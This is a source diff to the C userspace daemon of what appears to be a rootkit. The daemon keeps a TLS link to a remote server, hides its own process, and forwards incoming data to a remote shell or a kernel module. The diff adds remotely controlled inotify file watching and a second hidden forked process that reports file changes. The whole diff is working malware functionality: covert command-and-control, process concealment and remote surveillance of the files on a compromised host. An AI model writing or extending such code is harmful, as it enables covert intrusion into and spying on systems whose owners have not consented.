@@ -5,8 +5,12 @@
  * The socket handling for userspace
  */
 
+//Needed for NAME_MAX constant
+#define _POSIX_C_SOURCE 200809L
+
 #include <asm/types.h>
 #include <assert.h>
+#include <limits.h>
 #include <linux/tcp.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
@@ -22,8 +26,11 @@
 #include <string.h>
 #include <sys/epoll.h>
 #include <sys/fcntl.h>
+#include <sys/inotify.h>
 #include <sys/prctl.h>
 #include <sys/socket.h>
+#include <sys/stat.h>
+#include <sys/types.h>
 #include <sys/un.h>
 #include <unistd.h>
 
@@ -248,6 +255,15 @@ int wait_for_epoll_event(const int epollfd, struct epoll_event* events) {
     return nevents;
 }
 
+int create_inotify_descriptor(void) {
+    int fd = inotify_init1(IN_NONBLOCK | IN_CLOEXEC);
+    if (fd < 0) {
+        perror("inotify_init1");
+        exit(EXIT_FAILURE);
+    }
+    return fd;
+}
+
 /*
  * function:
  *    main
@@ -296,6 +312,11 @@ int main(void) {
     close(local_tls_socket);
 
     int remote_sock = create_remote_socket();
+
+    int inot_fd = create_inotify_descriptor();
+    int inot_epoll = create_epoll_fd();
+    int inot_wds[8192];
+    size_t inot_watch_count = 0;
 
     SSL* ssl = SSL_new(ctx);
     SSL_set_fd(ssl, remote_sock);
@@ -381,30 +402,91 @@ int main(void) {
     } else {
         setsid();
 
-        hide_proc();
-
         //See if I can remove unix socket files after connection
         unlink(UNIX_SOCK_PATH);
 
-        //Read
-        for (;;) {
-            int size = SSL_read(ssl, buffer, MAX_PAYLOAD);
-            printf("Read %d from server\n", size);
-            if (size < 0) {
-                perror("SSL_read");
-                break;
-            } else if (size == 0) {
-                break;
+        if (wrapped_fork()) {
+            setsid();
+            hide_proc();
+
+            //Read
+            for (;;) {
+                int size = SSL_read(ssl, buffer, MAX_PAYLOAD);
+                printf("Read %d from server\n", size);
+                if (size < 0) {
+                    perror("SSL_read");
+                    break;
+                } else if (size == 0) {
+                    break;
+                }
+                if (buffer[0] == '!') {
+                    if (size >= 7 && strncmp("watch", (char*) (buffer + 1), 5) == 0) {
+                        //Register inotify handle here
+                        int wd;
+                        if ((wd = inotify_add_watch(
+                                     inot_fd, (char*) (buffer + 7), IN_CREATE | IN_MODIFY))
+                                < 0) {
+                            perror("inotify_add_watch");
+                            exit(EXIT_FAILURE);
+                        }
+                        //Save watch descriptor
+                        inot_wds[inot_watch_count++] = wd;
+                    } else if (strncmp("unwatch", (char*) (buffer + 1), 7) == 0) {
+                        //Unregister all inotify handles here
+                        for (size_t i = 0; i < inot_watch_count; ++i) {
+                            inotify_rm_watch(inot_fd, inot_wds[i]);
+                        }
+                    } else {
+                        printf("Wrote %d to kernel module\n", size);
+                        write(conn_sock, buffer + 1, size - 1);
+                    }
+                } else {
+                    printf("Wrote %d to remote shell\n", size);
+                    //Pass message to shell process
+                    write(remote_shell_sock, buffer, size);
+                }
+                memset(buffer, 0, MAX_PAYLOAD);
             }
-            if (buffer[0] == '!') {
-                printf("Wrote %d to kernel module\n", size);
-                write(conn_sock, buffer + 1, size - 1);
-            } else {
-                printf("Wrote %d to remote shell\n", size);
-                //Pass message to shell process
-                write(remote_shell_sock, buffer, size);
+        } else {
+            setsid();
+            hide_proc();
+
+            //Handle inotify stuffs here
+            struct epoll_event ev;
+            ev.data.fd = inot_fd;
+            ev.events = EPOLLIN | EPOLLET;
+
+            add_epoll_socket(inot_epoll, inot_fd, &ev);
+
+            struct epoll_event* event_list = calloc(100, sizeof(struct epoll_event));
+
+            unsigned char buf[sizeof(struct inotify_event) + NAME_MAX + 1];
+            struct inotify_event* ie = (struct inotify_event*) buf;
+
+            for (;;) {
+                int n = wait_for_epoll_event(inot_epoll, event_list);
+                for (int i = 0; i < n; ++i) {
+                    int s;
+                empty_inotify:
+                    s = read(inot_fd, buf, sizeof(buf));
+                    if (s < 0 && errno != EAGAIN) {
+                        perror("inotify_epoll_read");
+                        exit(EXIT_FAILURE);
+                    }
+                    if (errno == EAGAIN) {
+                        break;
+                    }
+                    //handle updated log file
+                    if (ie->mask & IN_MODIFY) {
+                        printf("%s was modified\n", ie->name);
+                    } else if (ie->mask & IN_CREATE) {
+                        printf("%s was created\n", ie->name);
+                    }
+                    goto empty_inotify;
+                }
             }
-            memset(buffer, 0, MAX_PAYLOAD);
+
+            free(event_list);
         }
     }
 
@@ -414,6 +496,9 @@ int main(void) {
 
     close(local_tls_socket);
     close(remote_shell_unix);
+
+    close(inot_fd);
+    close(inot_epoll);
 
     unlink(UNIX_SOCK_PATH);
 
